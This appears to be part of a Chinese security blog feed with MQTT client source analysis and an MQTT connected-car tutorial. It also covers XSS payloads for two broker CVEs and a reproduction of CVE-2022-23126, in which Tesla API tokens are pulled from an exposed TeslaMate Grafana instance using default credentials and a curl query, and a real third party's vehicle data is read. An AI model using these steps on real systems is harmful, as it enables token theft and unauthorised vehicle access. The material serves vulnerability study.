+<pre><code class="language-java">public void run() {
+		sendThread = Thread.currentThread();
+		sendThread.setName(threadName);
+		final String methodName = &quot;run&quot;;
+		MqttWireMessage message = null;
+
+		try {
+			runningSemaphore.acquire();
+		} catch (InterruptedException e) {
+			running = false;
+			return;
+		}
+
+		try {
+			while (running &amp;&amp; (out != null)) {
+				try {
+					message = clientState.get();
+					if (message != null) {
+						//@TRACE 802=network send key={0} msg={1}
+						log.fine(CLASS_NAME,methodName,&quot;802&quot;, new Object[] {message.getKey(),message});
+
+						if (message instanceof MqttAck) {
+							out.write(message);
+							out.flush();
+						} else {
+							MqttToken token = tokenStore.getToken(message);
+							// While quiescing the tokenstore can be cleared so need
+							// to check for null for the case where clear occurs
+							// while trying to send a message.
+							if (token != null) {
+								synchronized (token) {
+									out.write(message);
+									try {
+										out.flush();
+									} catch (IOException ex) {
+										// The flush has been seen to fail on disconnect of a SSL socket
+										// as disconnect is in progress this should not be treated as an error
+										if (!(message instanceof MqttDisconnect)) {
+											throw ex;
+										}
+									}
+									clientState.notifySent(message);
+								}
+							}
+						}
+					} else { // null message
+						//@TRACE 803=get message returned null, stopping}
+						log.fine(CLASS_NAME,methodName,&quot;803&quot;);
+
+						running = false;
+					}
+				} catch (MqttException me) {
+					handleRunException(message, me);
+				} catch (Exception ex) {
+					handleRunException(message, ex);
+				}
+			} // end while
+		} finally {
+			running = false;
+			runningSemaphore.release();
+		}
+
+		//@TRACE 805=&lt;
+		log.fine(CLASS_NAME, methodName,&quot;805&quot;);
+
+	}
+</code></pre>
+<p>然后启动回调监听</p>
+<pre><code class="language-java">callback.start(&quot;MQTT Call: &quot;+getClient().getClientId(), executorService);
+</code></pre>
+<p>最后调用internalSend发送mqtt的CONNECT数据包</p>
+<pre><code class="language-java">internalSend(conPacket, conToken);
+</code></pre>
+<figure data-type="image" tabindex="16"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206131701264.png" alt="image-20220613154539660" loading="lazy"></figure>
+<p>org.eclipse.paho.client.mqttv3.internal.ClientState#send来进行发送</p>
+<p>单单连接broker的流程分析就十分繁琐，剩下的流程分析创建主题和发布主题内容是一个入口，订阅主题和接收主题内容也是一个入口，这里给出流程的入口，感兴趣可以一步一步调试分析</p>
+<ul>
+<li>创建主题&amp;发布主题内容
+<ul>
+<li>入口函数：org.eclipse.paho.client.mqttv3.MqttAsyncClient#publish()</li>
+</ul>
+</li>
+<li>订阅主题&amp;接收主题内容
+<ul>
+<li>入口函数：org.eclipse.paho.client.mqttv3.MqttAsyncClient#subscribe()</li>
+</ul>
+</li>
+</ul>
+<h2 id="mqtt安全">MQTT安全</h2>
+<p>直接通过实例来了解一下MQTT安全。由于MQTT运用也比较新，而java库Eclipse Paho Java Client相关漏洞就更少，对于他本身并没有什么漏洞，而是有两个MQTT信息接收之后存储输出不当的例子。</p>
+<p>分别是hivemq(CVE-2020-13821)和apache-artemis(CVE-2020-13932)</p>
+<p>这里使用mosquitto作为客户端去实现</p>
+<h3 id="hivemqcve-2020-13821">hivemq(CVE-2020-13821)</h3>
+<p>这里是利用clintid来进行攻击</p>
+<figure data-type="image" tabindex="17"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206131701265.png" alt="image-20220509155307161" loading="lazy"></figure>
+<p>连接broker</p>
+<figure data-type="image" tabindex="18"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206131701266.png" alt="image-20220509155402873" loading="lazy"></figure>
+<p>刷新snapshot，没有过滤直接打印了客户端的clintid导致xss</p>
+<figure data-type="image" tabindex="19"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206131701267.png" alt="image-20220509155428340" loading="lazy"></figure>
+<h3 id="apache-artemiscve-2020-13932">apache-artemis(CVE-2020-13932)</h3>
+<p>访问</p>
+<ul>
+<li>http://192.168.100.247:8161/</li>
+</ul>
+<figure data-type="image" tabindex="20"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206131701268.png" alt="image-20220509170516354" loading="lazy"></figure>
+<p>构造恶意的clientid或topics名字来攻击控制台</p>
+<pre><code>&lt;img src=x onerror=alert(1)&gt;
+</code></pre>
+<figure data-type="image" tabindex="21"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206131701269.png" alt="image-20220509172749949" loading="lazy"></figure>
+<p>这里通过主题名称来进行攻击，在Diagram模块将未过滤的主题名称直接打印导致xss</p>
+<figure data-type="image" tabindex="22"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206131701270.png" alt="image-20220509172734304" loading="lazy"></figure>
+<p>上面两个例子虽然在MQTT协议中都不属于客户端而是Broker，但是也可以看到在MQTT中web漏洞的重点是信息的交互</p>
+<p>如果应用了客户端，用来连接broker以及接收和发送主题信息</p>
+<ul>
+<li>发送是自己控制所以不可控的就是接收的主题信息，就要做好过滤以及减少可能的危险操作</li>
+</ul>
+<p>如果是应用的broker，用来处理连接的信息以及客户端之间交互的主题信息</p>
+<ul>
+<li>那么连接信息和客户端之间交互的信息都是不可控的，更要做好充足的过滤以及防护手段</li>
+</ul>
+<p>在web应用层对于MQTT协议来说，更多的漏洞是在于你对信息的处理不当</p>
+<p>除了以上两个项目还有很多使用mqtt客户端或broker的物联网项目如</p>
+<ul>
+<li>wso2</li>
+<li>thingsboard</li>
+</ul>
+<p>也可以根据信息获取之后的利用来进行漏洞分析</p>
+<h2 id="参考">参考</h2>
+<ul>
+<li>mqttv3文档：https://www.eclipse.org/paho/files/javadoc/index.html</li>
+<li>mqttv3项目：https://github.com/eclipse/paho.mqtt.java</li>
+<li>apache-artemis漏洞环境：https://www.apache.org/dyn/closer.cgi?filename=activemq/activemq-artemis/2.22.0/apache-artemis-2.22.0-bin.tar.gz&amp;action=download</li>
+<li>hivemq漏洞环境：docker pull hivemq/hivemq4:4.3.2</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[少年黑了特斯拉？CVE-2022-23126分析与复现]]></title>
+        <id>https://liangyueliangyue.github.io/post/shao-nian-hei-liao-te-si-la-cve-2022-23126-fen-xi-yu-fu-xian/</id>
+        <link href="https://liangyueliangyue.github.io/post/shao-nian-hei-liao-te-si-la-cve-2022-23126-fen-xi-yu-fu-xian/">
+        </link>
+        <updated>2022-06-07T08:57:06.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="cve-2022-23126">CVE-2022-23126</h1>
+<h2 id="首发于火线zonehttpszonehuoxiancnd1235-cve-2022-23126">首发于火线Zone：https://zone.huoxian.cn/d/1235-cve-2022-23126</h2>
+<p>详情：https://medium.com/@david_colombo/how-i-got-access-to-25-teslas-around-the-world-by-accident-and-curiosity-8b9ef040a028</p>
+<p>2022年1月份，年轻黑客宣称远程控制了25 辆特斯拉</p>
+<figure data-type="image" tabindex="1"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206011133032.png" alt="image-20220601112352008" loading="lazy"></figure>
+<p>其实就是这个cve的来源，而真正的漏洞来自于https://github.com/adriankumpf/teslamate暴露在外网端口上</p>
+<p>teslamate是Tesla 的功能强大的自托管数据记录器</p>
+<p>特点：</p>
+<ul>
+<li>通过Elixir编写</li>
+<li>数据存储在<strong>Postgres</strong>数据库中</li>
+<li><strong>使用Grafana</strong>进行可视化和数据分析</li>
+<li>车辆数据发布到本地<strong>MQTT</strong> Broker</li>
+</ul>
+<p><strong>先从作者的文章来看看这个漏洞的细节</strong></p>
+<h2 id="信息泄露">信息泄露</h2>
+<p>访问dockerfile默认暴露的4000端口可以得到特斯拉地址信息</p>
+<figure data-type="image" tabindex="2"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206011133034.png" alt="image-20220531114258685" loading="lazy"></figure>
+<p>但因为使用了grafana，如果开启了匿名访问（即免登陆访问），且3000端口也暴露在公网，那么grafana就会泄露大量数据如：特斯拉去过的地方，充电的地方，当前位置，通常停放的地方，驾驶时间，旅行速度，导航请求，软件更新历史，甚至特斯拉周围的天气历史等等多得多。</p>
+<h3 id="grafana">Grafana</h3>
+<p>Grafana 是一个监控仪表系统，它是由 Grafana Labs 公司开源的的一个系统监测 (System Monitoring) 工具。它可以大大帮助你简化监控的复杂度，你只需要提供你需要监控的数据，它就可以帮你生成各种可视化仪表。同时它还有报警功能，可以在系统出现问题时通知你。</p>
+<h3 id="修复措施">修复措施</h3>
+<p>也就是将默认开启的匿名访问关闭</p>
+<figure data-type="image" tabindex="3"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206011133035.png" alt="image-20220531114440349" loading="lazy"></figure>
+<h2 id="进一步获取tesla-用户api-密钥">进一步获取Tesla 用户API 密钥</h2>
+<p>grafana确实保存了 API 密钥，它还存储了所有其他数据。API 密钥既不单独存储也不加密。但需要<a href="https://grafana.com/docs/grafana/latest/explore/">Grafana Explore</a>来运行自定义查询。这需要身份验证（经过测试，匿名访问不需要身份验证）。</p>
+<p>然后就是利用默认密码（admin/admin）/弱口令来进行身份验证，然后得到查询权限</p>
+<p><strong>如何访问世界各地的随机特斯拉</strong></p>
+<ul>
+<li>在互联网范围内搜索 TeslaMate 实例（例如搜索 MQTT 代理）。</li>
+<li>确保它们使用不安全的默认 Docker 配置运行（这应该现在已经修复，因为用户请尽快拉取最新版本）。</li>
+<li>转到端口 3000 以访问 Grafana 仪表板。</li>
+<li>使用默认凭据登录*（当然只有在明确授权的情况下才能这样做）*。</li>
+<li>转到资源管理器选项卡。</li>
+<li>使用查询生成器提取 API 并刷新令牌。</li>
+<li>玩特斯拉（当然仅限于您拥有的车辆），玩得开心。</li>
+</ul>
+<p><strong>使用 Tesla API 令牌可以做的事情包括但不限于：</strong></p>
+<ul>
+<li>解锁车门。</li>
+<li>打开窗户。</li>
+<li>开始无钥匙驾驶。</li>
+<li>与特斯拉分享视频。</li>
+<li>更改加热器/冷却器设置。</li>
+<li>按喇叭和闪烁的灯光。</li>
+</ul>
+<p>最终结果是特斯拉撤销了数千个密钥，所以这可能是一个更普遍的问题。</p>
+<h2 id="实例复现">实例复现</h2>
+<p>互联网一个实例（外国）</p>
+<h3 id="获取tesla-key">获取tesla key</h3>
+<p>4000端口默认开放,访问可以得到地理位置等一些信息</p>
+<figure data-type="image" tabindex="4"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206011133036.png" alt="image-20220601094922516" loading="lazy"></figure>
+<p>访问3000，开启了匿名访问</p>
+<figure data-type="image" tabindex="5"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206011133037.png" alt="image-20220601095016606" loading="lazy"></figure>
+<p>那么可以直接得到更多tesla信息</p>
+<figure data-type="image" tabindex="6"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206011500285.png" alt="image-20220601115841188" loading="lazy"></figure>
+<p>然后访问explorer数据库查询接口通过sql语句查询获取key</p>
+<pre><code>curl http://xxxx:3000/api/tsdb/query
+{&quot;queries&quot;:[{&quot;refId&quot;:&quot;A&quot;,&quot;intervalMs&quot;:60000,&quot;maxDataPoints&quot;:1843,&quot;datasourceId&quot;:1,&quot;rawSql&quot;:&quot;SELECT\n  id AS \&quot;time\&quot;,\n  *\nFROM tokens\nORDER BY 1&quot;,&quot;format&quot;:&quot;table&quot;}]}
+</code></pre>
+<p>如果，没开启匿名访问，需要尝试默认密码或者弱口令，成功登录后一样获取信息或者使用explorer进行查询key</p>
+<figure data-type="image" tabindex="7"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206011133038.png" alt="image-20220531175620101" loading="lazy"></figure>
+<p>得到数据库中的Tesla key</p>
+<pre><code>access:
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+</code></pre>
+<p>前面加bearer (也就是jwt)然后访问Tesla官方api接口</p>
+<ul>
+<li>https://www.teslaapi.io/</li>
+</ul>
+<h3 id="获取车辆列表">获取车辆列表</h3>
+<ul>
+<li>https://owner-api.teslamotors.com/api/1/vehicles</li>
+</ul>
+<figure data-type="image" tabindex="8"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206011133039.png" alt="image-20220601095440115" loading="lazy"></figure>
+<p>得到车辆id（注意这里是id不是vehicles_id）</p>
+<h3 id="再获取车辆信息">再获取车辆信息</h3>
+<ul>
+<li>https://owner-api.teslamotors.com/api/1/vehicles/xxxx/vehicle_data</li>
+</ul>
+<figure data-type="image" tabindex="9"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206011133040.png" alt="image-20220601095827362" loading="lazy"></figure>
+<p>官方还提供了对车的种种操作比原文作者说的更多</p>
+<figure data-type="image" tabindex="10"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206011133041.png" alt="image-20220601095900208" loading="lazy"></figure>
+<p>这里未授权就不进行深入尝试了</p>
+<h2 id="后记">后记</h2>
+<p>复现下来，这是一个tesla的开源项目的漏洞和tesla本身并没有什么联系，漏洞利用难度也很低，只是web应用层的简单利用，但是影响也不小。即使在现在互联网上还是有很多存在漏洞的实例。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[MQTT协议-车联网应用&&源码分析（一）]]></title>
+        <id>https://liangyueliangyue.github.io/post/mqtt-xie-yi-che-lian-wang-ying-yong-andyuan-ma-fen-xi-yi/</id>
+        <link href="https://liangyueliangyue.github.io/post/mqtt-xie-yi-che-lian-wang-ying-yong-andyuan-ma-fen-xi-yi/">
+        </link>
+        <updated>2022-05-30T03:55:16.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="mqtt协议">MQTT协议</h1>
+<p>首发于跳跳糖：https://tttang.com/archive/1609/</p>
+<p>Message Queue Telemetry Transport，消息队列遥测传输</p>
+<p>MQTT是基于TCP/IP协议栈构建的异步通信消息协议，是一种轻量级的发布、订阅信息传输协议。可在不可靠的网络环境中进行扩展，适用于设备硬件存储空间或网络带宽有限的场景。使用MQTT协议，消息发送者与接收者不受时间和空间的限制。基于发布/订阅模式的物联网通信协议，简单易实现、支持 QoS、报文小等特点，专门为网络受限设备、低宽带以及高延迟和不可靠的网络而设计。由于以上轻量级的特点，是实现智能家居的首选传输协议。</p>
+<p>具体的工作原理学习可以参考以下几个链接，这里不着重讲了</p>
+<ul>
+<li>http://www.taichi-maker.com/homepage/esp8266-nodemcu-iot/iot-tuttorial/mqtt-tutorial/</li>
+<li>https://zhuanlan.zhihu.com/p/89057819</li>
+<li>https://zhuanlan.zhihu.com/p/386994328</li>
+<li>http://www.taichi-maker.com/homepage/esp8266-nodemcu-iot/iot-tuttorial/mqtt-tutorial/</li>
+</ul>
+<h2 id="mqtt-协议在车联网中的应用">MQTT 协议在车联网中的应用</h2>
+<h3 id="车辆数据主动上报">车辆数据主动上报</h3>
+<p>车载设备（T-box，车机等）作为车辆运行数据的收集者，基于固定频率将车内各类控制器、传感器等数据打包发送到平台端。</p>
+<p>例如在用户同意的前提下，车辆在行驶过程中会将位置、车速、电量等信息按照固定频率上报云平台，云端应用基于这些数据，提供位置查找、超速提醒、电量提醒、地理围栏服务给终端用户使用。</p>
+<ul>
+<li>车-&gt;broker-&gt;云平台-&gt;broker-&gt;车</li>
+</ul>
+<h3 id="平台请求下发后车辆数据上报">平台请求下发后车辆数据上报</h3>
+<p>当云平台需要<strong>获取车辆的最新状态及信息</strong>时，可以主动下发命令要求车辆上报数据。</p>
+<p>例如在诊断场景下，平台通过 MQTT 下发诊断命令至车辆，当车内各设备完成诊断操作后，会将诊断数据打包后上报至云平台，车辆诊断工程师将根据采集到的诊断数据对于车况进行整体的分析及问题定位。</p>
+<ul>
+<li>平台-&gt;broker-&gt;车-&gt;broker-&gt;平台</li>
+</ul>
+<h3 id="平台指令下发">平台指令下发</h3>
+<p><strong>车辆远程控制</strong>是车联网业务中最常见、最典型的场景，各主机厂均在手机 App 中提供各种远控功能，例如远程启动、远程开车门、远程闪灯鸣笛等等。</p>
+<p>此类场景下，手机 App 发送控制命令至云平台，平台应用经过权限检查、安全检查等一系列操作后，通过 MQTT 将命令下发至车辆执行，车辆端执行成功后，异步通知平台执行结果。</p>
+<ul>
+<li>app-&gt;云平台-&gt;broker-&gt;车</li>
+</ul>
+<h3 id="车辆客户端请求后平台数据下发">车辆客户端请求后平台数据下发</h3>
+<p>在 SDV（软件定义汽车）的大背景下，车内很多配置是可以做到动态变化的，例如数据采集规则、安全访问规则，所以车辆在点火启动后，会主动请求平台最新的相关配置，若两侧配置不一致，平台侧会下发最新的配置信息至车辆，车辆侧实时生效。</p>
+<ul>
+<li>车-&gt;broker-&gt;云平台-&gt;broker-&gt;车</li>
+</ul>
+<h3 id="数据集成">数据集成</h3>
+<p>将流经 EMQX 的海量车联网数据与业务系统连接是客户最重视的能力，EMQX 内置了规则引擎和数据桥接能力，可以将 MQTT 数据流式传输到 Kafka、各类 SQL / NoSQL / 时序数据库中，而实际项目中绝大多数客户都使用 Kafka 作为后端流处理组件。</p>
+<p>Kafka 专注于数据的存储和读取，而 EMQX 则侧重于客户端和服务器之间的通信，EMQX 用来快速接收和处理来自大量物联网设备的消息，Kafka 可以收集并存储这些数据并将其发送给后端程序来分析和处理，这个架构是目前应用最广的数据集成方案。</p>
+<ul>
+<li>车-&gt;broker-&gt;数据库</li>
+</ul>
+<h2 id="emqx中http转发">EMQX中http转发</h2>
+<p>EMQX (Erlang/Enterprise/Elastic MQTT Broker) 是基于 Erlang/OTP 平台开发的开源物联网 MQTT 消息服务器，承担MQTT协议中broker角色。</p>
+<p>下面利用EMQX承担broker，java mqttv3 以及mqtt.fx承担client来简单模拟一个用户车上报车速云平台下发通知的过程。</p>
+<h3 id="车主动上报车速">车主动上报车速</h3>
+<p>这里是通过MQTT.fx来担任车的mqtt消息发送</p>
+<p><strong>连接配置</strong></p>
+<figure data-type="image" tabindex="1"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121615.png" alt="image-20220512143636179" loading="lazy"></figure>
+<p><strong>发布主题信息</strong></p>
+<figure data-type="image" tabindex="2"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121616.png" alt="image-20220512143648961" loading="lazy"></figure>
+<p><strong>接收主题信息</strong></p>
+<figure data-type="image" tabindex="3"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121617.png" alt="202205121739198" loading="lazy"></figure>
+<h3 id="emqx将mqtt信息转发至云平台">EMQX将MQTT信息转发至云平台</h3>
+<p><strong>首先创建web服务资源</strong></p>
+<figure data-type="image" tabindex="4"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121618.png" alt="202205121739199" loading="lazy"></figure>
+<p><strong>然后创建响应动作</strong></p>
+<figure data-type="image" tabindex="5"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121619.png" alt="image-20220512173150067" loading="lazy"></figure>
+<p><strong>最后编辑规则</strong></p>
+<figure data-type="image" tabindex="6"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121620.png" alt="image-20220512173159778" loading="lazy"></figure>
+<p>即可将http请求进行转发</p>
+<h3 id="云平台通过mqtt信息返回消息">云平台通过MQTT信息返回消息</h3>
+<p>这里可以平台端直接订阅车端car_speed拿到信息然后返回</p>
+<p>信息接收+处理</p>
+<pre><code class="language-java">package at.dallermassl.ap.security.taint.webapp;
+
+import javax.servlet.ServletException;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+
+public class Test2 extends HttpServlet {
+    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+        try {
+            String speed = request.getParameter(&quot;car_speed&quot;);
+            System.out.println(&quot;speed：&quot;+speed);
+            String serverURI=&quot;tcp://192.168.100.146:1883&quot;;
+            String clientID=&quot;message_send&quot;;
+            MqttProducer mqttProducer = new MqttProducer(serverURI, clientID);
+            String msg =&quot;&quot;;
+            if (Integer.parseInt(speed)&gt;=90){
+                msg = &quot;hypervelocity in time:&quot; + System.currentTimeMillis() ;
+                mqttProducer.send(&quot;car/message&quot;, 1, true, msg);
+            }else {
+                msg = &quot;normal in time:&quot;+ System.currentTimeMillis();
+                mqttProducer.send(&quot;car/message&quot;, 1, true, msg);
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+        doGet(request, response);
+    }
+}
+</code></pre>
+<p>MqttProducer</p>
+<pre><code class="language-java">package at.dallermassl.ap.security.taint.webapp;
+
+import org.eclipse.paho.client.mqttv3.MqttClient;
+import org.eclipse.paho.client.mqttv3.MqttConnectOptions;
+import org.eclipse.paho.client.mqttv3.MqttException;
+import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence;
+
+public class MqttProducer {
+
+    private MqttClient mqttClient;
+
+    public MqttProducer(String SERVER_URI,String CLIENT_ID){
+        try {
+            MemoryPersistence persistence = new MemoryPersistence();
+            mqttClient = new MqttClient(SERVER_URI, CLIENT_ID,persistence);
+            MqttConnectOptions connOpts = new MqttConnectOptions();
+            connOpts.setCleanSession(true);
+            System.out.println(&quot;Connecting to broker: &quot;+ SERVER_URI);
+            mqttClient.connect(connOpts);
+        }catch (Exception ex){
+            ex.printStackTrace();
+        }
+    }
+    public void send(String topic, int qos, boolean retained, String payload) {
+        if (mqttClient == null){
+            return;
+        }
+        try {
+            mqttClient.publish(topic, payload.getBytes(), qos, retained);
+        } catch (MqttException e) {
+            System.out.println(e.getMessage());
+        }
+    }
+}
+</code></pre>
+<p>最后成果</p>
+<figure data-type="image" tabindex="7"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121621.gif" alt="202205121739202" loading="lazy"></figure>
+<p><strong>idea接收信息</strong></p>
+<figure data-type="image" tabindex="8"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121622.png" alt="image-20220512173827931" loading="lazy"></figure>
+<h2 id="客户端直接返回">客户端直接返回</h2>
+<h3 id="车端连接">车端连接</h3>
+<figure data-type="image" tabindex="9"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121623.png" alt="image-20220512175049193" loading="lazy"></figure>
+<h3 id="broker">broker</h3>
+<p>emqx</p>
+<h3 id="云平台">云平台</h3>
+<pre><code class="language-java">package com.example.demo.mqtt;
+
+
+public class Test2 {
+    public static void main(String[] args) {
+        String serverURI=&quot;tcp://192.168.100.146:1883&quot;;
+        String clientID=&quot;cloud_platform&quot;;
+        MqttSubscriber mqttSubscriber = new MqttSubscriber(serverURI, clientID);
+        mqttSubscriber.subscribe(&quot;car/speed&quot;);
+    }
+}
+</code></pre>
+<p>MqttSubscriber</p>
+<pre><code class="language-java">package com.example.demo.mqtt;
+
+import org.eclipse.paho.client.mqttv3.*;
+import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence;
+
+public class MqttSubscriber {
+
+    private MqttClient mqttClient;
+
+    public MqttSubscriber(String SERVER_URI,String CLIENT_ID){
+        try {
+            MemoryPersistence persistence = new MemoryPersistence();
+            mqttClient = new MqttClient(SERVER_URI, CLIENT_ID,persistence);
+            MqttConnectOptions connOpts = new MqttConnectOptions();
+            connOpts.setCleanSession(true);
+            mqttClient.connect(connOpts);
+
+        }catch (Exception ex){
+            ex.printStackTrace();
+        }
+    }
+    public void subscribe(String topic) {
+        String SERVER_URI = &quot;tcp://192.168.100.146:1883&quot;;
+        String CLIENT_ID = &quot;cloud_platform_send&quot;;
+        if (mqttClient == null){
+            return;
+        }
+        try {
+            mqttClient.subscribe(topic);
+            mqttClient.setCallback(new MqttCallback() {
+                @Override
+                public void connectionLost(Throwable throwable) {
+                    System.out.println(&quot;连接丢失&quot;);
+                }
+
+                @Override
+                public void messageArrived(String topic, MqttMessage mqttMessage) throws Exception {
+                    System.out.println(topic);
+                    System.out.println(mqttMessage.toString());
+                    MqttProducer mqttProducer = new MqttProducer(SERVER_URI, CLIENT_ID);
+                    String msg =&quot;&quot;;
+                    if (Integer.parseInt(mqttMessage.toString())&gt;=90){
+                        msg = &quot;hypervelocity! in time:&quot; + System.currentTimeMillis();
+                    }else {
+                        msg = &quot;normal! in time:&quot;+ System.currentTimeMillis();
+                    }
+                    mqttProducer.send(&quot;car/message&quot;, 1, true, msg);
+                }
+
+                @Override
+                public void deliveryComplete(IMqttDeliveryToken iMqttDeliveryToken) {
+                    System.out.println(&quot;delivery isComplete:&quot; + iMqttDeliveryToken.isComplete());
+                }
+            });
+        } catch (MqttException e) {
+            System.out.println(e.getMessage());
+        }
+    }
+}
+</code></pre>
+<p>最终效果和http转发一致</p>
+<figure data-type="image" tabindex="10"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121624.png" alt="image-20220512175747825" loading="lazy"></figure>
+<p><strong>idea返回信息</strong></p>
+<figure data-type="image" tabindex="11"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121625.png" alt="image-20220512175738496" loading="lazy"></figure>
+<h1 id="mqtt-v3-客户端库">MQTT-v3 客户端库</h1>
+<p>在上面使用java代码中使用的是Eclipse Paho Java Client</p>
+<p><a href="https://www.eclipse.org/paho/clients/java/">Eclipse Paho Java Client (opens new window)</a>是用 Java 编写的 MQTT 客户端库（MQTT Java Client），可用于 JVM 或其他 Java 兼容平台（例如Android）。Eclipse Paho Java Client 提供了MqttAsyncClient 和 MqttClient 异步和同步 API。</p>
+<p>从上面的简单的示例代码先学习一下一些概念</p>
+<h2 id="mqttclient">MqttClient</h2>
+<figure data-type="image" tabindex="12"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121626.png" alt="image-20220516165234369" loading="lazy"></figure>
+<p>继承自IMqttClient接口，定义了如下方法</p>
+<figure data-type="image" tabindex="13"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121627.png" alt="image-20220516165308642" loading="lazy"></figure>
+<p>基本可以做到望字知意。</p>
+<p>再回到MqttClient，仔细看构造函数，可以发现MqttClient对象中还创建了org.eclipse.paho.client.mqttv3.MqttAsyncClient</p>
+<pre><code class="language-java"> public MqttClient(String serverURI, String clientId) throws MqttException {
+        this(serverURI, clientId, new MqttDefaultFilePersistence());
+    }
+
+    public MqttClient(String serverURI, String clientId, MqttClientPersistence persistence) throws MqttException {
+        this.aClient = null;
+        this.timeToWait = -1L;
+        this.aClient = new MqttAsyncClient(serverURI, clientId, persistence);
+    }
+
+    public MqttClient(String serverURI, String clientId, MqttClientPersistence persistence, ScheduledExecutorService executorService) throws MqttException {
+        this.aClient = null;
+        this.timeToWait = -1L;
+        this.aClient = new MqttAsyncClient(serverURI, clientId, persistence, new ScheduledExecutorPingSender(executorService), executorService);
+    }
+</code></pre>
+<p>org.eclipse.paho.client.mqttv3.MqttAsyncClient中定义了mqtt客户端参数</p>
+<figure data-type="image" tabindex="14"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121628.png" alt="image-20220516165745038" loading="lazy"></figure>
+<p>实现自IMqttAsyncClient接口，方法如下（基本和IMqttClient一样）</p>
+<figure data-type="image" tabindex="15"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121629.png" alt="image-20220516165817023" loading="lazy"></figure>
+<p>查看package.html对两个接口的描述</p>
+<pre><code>{@link org.eclipse.paho.client.mqttv3.IMqttAsyncClient MqttAsyncClient} which provides a non-blocking interface 
+{@link org.eclipse.paho.client.mqttv3.IMqttClient MqttClient} where methods block until the operation has completed.
+</code></pre>
+<p>可以知道IMqttAsyncClient是非堵塞的而IMqttClient是堵塞的</p>
+<p>再从文档看接口描述：</p>
+<ul>
+<li>IMqttClient 提供了一组方法，一旦 MQTT 操作完成，就会阻止并将控制权返回给应用程序。它是位于 IMqttAsyncClient 实现之上的薄层，主要用于与早期版本的 MQTT 客户端兼容。在大多数情况下，建议使用基于 IMqttAsyncClient 的客户端，它允许应用程序混合非阻塞和阻塞调用。</li>
+<li>如果使用基于 IMqttAsyncClient 的客户端，则应用程序不限于使用一种样式，因为可以在同一应用程序中使用阻塞和非阻塞方法。如果使用基于 IMqttClient 的客户端，则应用程序只能使用阻塞方法。有关阻塞客户端的更多详细信息，请参阅 IMqttClient</li>
+</ul>
+<p>显然，常用者是MqttAsyncClient ，实际调试看看</p>
+<p>MqttClient中存储的只有MqttAsyncClient 对象</p>
+<figure data-type="image" tabindex="16"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121630.png" alt="image-20220517112046488" loading="lazy"></figure>
+<h2 id="mqttasyncclient">MqttAsyncClient</h2>
+<p>看一下IMqttAsyncClient 方法，首先是静态方法</p>
+<pre><code class="language-java">static {
+        log = LoggerFactory.getLogger(&quot;org.eclipse.paho.client.mqttv3.internal.nls.logcat&quot;, CLASS_NAME);
+        reconnectDelay = 1000;
+        clientLock = new Object();
+    }
+</code></pre>
+<p>定义了log对象，mqtt重连延迟，以及锁，再来看构造方法</p>
+<pre><code class="language-java">	public MqttAsyncClient(String serverURI, String clientId) throws MqttException {
+        this(serverURI, clientId, new MqttDefaultFilePersistence());
+    }
+
+    public MqttAsyncClient(String serverURI, String clientId, MqttClientPersistence persistence) throws MqttException {
+        this(serverURI, clientId, persistence, new TimerPingSender());
+    }
+
+    public MqttAsyncClient(String serverURI, String clientId, MqttClientPersistence persistence, MqttPingSender pingSender) throws MqttException {
+        this(serverURI, clientId, persistence, pingSender, (ScheduledExecutorService)null);
+    }
+
+    public MqttAsyncClient(String serverURI, String clientId, MqttClientPersistence persistence, MqttPingSender pingSender, ScheduledExecutorService executorService) throws MqttException {
+        this.reconnecting = false;
+        log.setResourceName(clientId);
+        if (clientId == null) {
